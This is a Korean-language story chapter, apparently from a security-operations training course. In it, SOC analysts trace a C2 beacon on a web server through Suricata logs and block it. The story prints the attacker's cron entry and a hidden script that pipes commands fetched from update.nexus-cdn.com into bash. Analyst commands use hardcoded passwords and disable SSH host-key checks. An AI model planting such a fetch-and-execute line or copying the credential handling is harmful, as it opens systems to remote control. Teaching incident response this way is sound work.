# Chapter 1: 비콘

---

4월 둘째 주 월요일. 송진호가 관제실로 뛰어들어왔다.

"C2 비콘을 찾았습니다."

김영훈이 고개를 들었다. "어디?"

"web 서버. 내부 네트워크에서 **외부로 주기적 HTTP 요청**을 보내고 있어요."

---

진호가 Suricata의 eve.json에서 발견한 패턴:

```bash
# 주기적 HTTP 요청 패턴 분석
sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \
  "echo 1 | sudo -S cat /var/log/suricata/eve.json 2>/dev/null | \
   python3 -c \"
import sys, json
for line in sys.stdin:
    try:
        e = json.loads(line)
        if e.get('event_type') == 'http' and e.get('src_ip') == '10.20.30.80':
            dst = e.get('dest_ip','?')
            url = e.get('http',{}).get('hostname','') + e.get('http',{}).get('url','')
            if dst not in ('10.20.30.1','10.20.30.100','10.20.30.201'):
                print(f'{e[\"timestamp\"]} → {dst} | {url}')
    except: pass
\" 2>/dev/null | head -20"
```

```
2026-04-07T01:00:15 → 94.130.x.x | update.nexus-cdn.com/check?v=1.0&id=nx01
2026-04-07T01:15:15 → 94.130.x.x | update.nexus-cdn.com/check?v=1.0&id=nx01
2026-04-07T01:30:15 → 94.130.x.x | update.nexus-cdn.com/check?v=1.0&id=nx01
2026-04-07T01:45:15 → 94.130.x.x | update.nexus-cdn.com/check?v=1.0&id=nx01
2026-04-07T02:00:15 → 94.130.x.x | update.nexus-cdn.com/check?v=1.0&id=nx01
```

"15분 간격. 정확히." 진호가 말했다. "**nexus-cdn.com**. 아까 분석한 유사 도메인이야."

"C2(Command & Control) 비콘이야." 김영훈이 즉시 판단했다. "공격자의 서버에 '나 여기 있어, 명령 줘'라고 **주기적으로 체크인**하는 패턴."

"URL 파라미터를 봐." 정규가 말했다. "`id=nx01`. 이건 **감염된 호스트의 식별자**야."

---

"이 비콘은 언제부터 있었어?" 김영훈이 물었다.

진호가 로그를 역추적했다.

```bash
# nexus-cdn.com 최초 접근 시점
sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \
  "echo 1 | sudo -S grep 'nexus-cdn' /var/log/suricata/eve.json 2>/dev/null | head -1"
```

```
{"timestamp":"2026-03-28T03:43:22","src_ip":"10.20.30.80","dest_ip":"94.130.x.x"...}
```

"**3월 28일 새벽 3시 43분.** 첫 번째 SSH 브루트포스 침해 때와 같은 날이야." 김영훈의 눈이 빛났다.

"guest03 계정이 만들어진 시각이 03:43이었잖아요!" 도윤이 말했다. "guest03을 만든 직후에 C2 비콘을 설치한 거예요!"

"맞아." 김영훈이 타임라인을 그렸다.


"**10일 넘게** 비콘이 동작하고 있었는데 아무도 몰랐어." 정규가 입술을 깨물었다.

"Suricata는 탐지했지만, nexus-cdn.com이 **악성 도메인 목록**에 없었으니까 alert가 안 올라왔어." 진호가 설명했다. "이건 **커스텀 C2 인프라**야. 알려진 IOC에 안 잡혀."

---

"즉시 차단." 김영훈이 지시했다.

```bash
# C2 도메인 차단 (nftables)
curl -s -X POST "http://localhost:8000/projects/$PID/dispatch" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{"command":"echo 1 | sudo -S nft add rule inet filter output ip daddr 94.130.0.0/16 drop","subagent_url":"http://10.20.30.1:8002"}'

# web 서버에서 C2 프로세스 식별 및 종료
curl -s -X POST "http://localhost:8000/projects/$PID/dispatch" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{"command":"ps aux | grep nexus-cdn | grep -v grep; crontab -l 2>/dev/null | grep nexus-cdn","subagent_url":"http://10.20.30.80:8002"}'
```

결과:

```
(ps에서 nexus-cdn 프로세스 없음)
*/15 * * * * curl -s http://update.nexus-cdn.com/check?v=1.0&id=nx01 > /dev/null 2>&1
```

"**crontab에 등록**되어 있었어." 김영훈이 말했다. "프로세스가 아니라 **cron job**이야. 15분마다 curl을 실행."

가람이 펄쩍 뛰었다. "이전에 제가 야간 근무 때 발견한 crontab 수정! `/tmp/.health_check.sh`도 있었는데—"

"어떤 내용이었어?" 김영훈이 물었다.

```bash
curl -s -X POST "http://localhost:8000/projects/$PID/dispatch" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{"command":"cat /tmp/.health_check.sh 2>/dev/null","subagent_url":"http://10.20.30.80:8002"}'
```

```bash
#!/bin/bash
# health check script
curl -s http://update.nexus-cdn.com/cmd?id=nx01 | bash
```

관제실이 얼어붙었다.

"C2에서 명령을 받아서 **bash로 실행**하는 스크립트." 김영훈의 목소리가 낮아졌다. "공격자가 nexus-cdn.com/cmd에 명령을 올리면, 15분 이내에 web 서버가 **그 명령을 실행**해."

"**원격 코드 실행.** 완전한 제어." 추박하가 만화책을 덮으며 말했다. "10일 동안."

---

가람은 수첩에 적었다.

> `C2 비콘: nexus-cdn.com, 15분 간격, cron + .health_check.sh`
> `03/28 설치, 04/07 발견. 10일간 탐지되지 않음.`
> `.health_check.sh = C2에서 명령을 받아 bash로 실행`
> `공격자는 10일간 web 서버를 완전히 제어할 수 있었다.`
> `그 10일 동안 무엇을 했는가?`
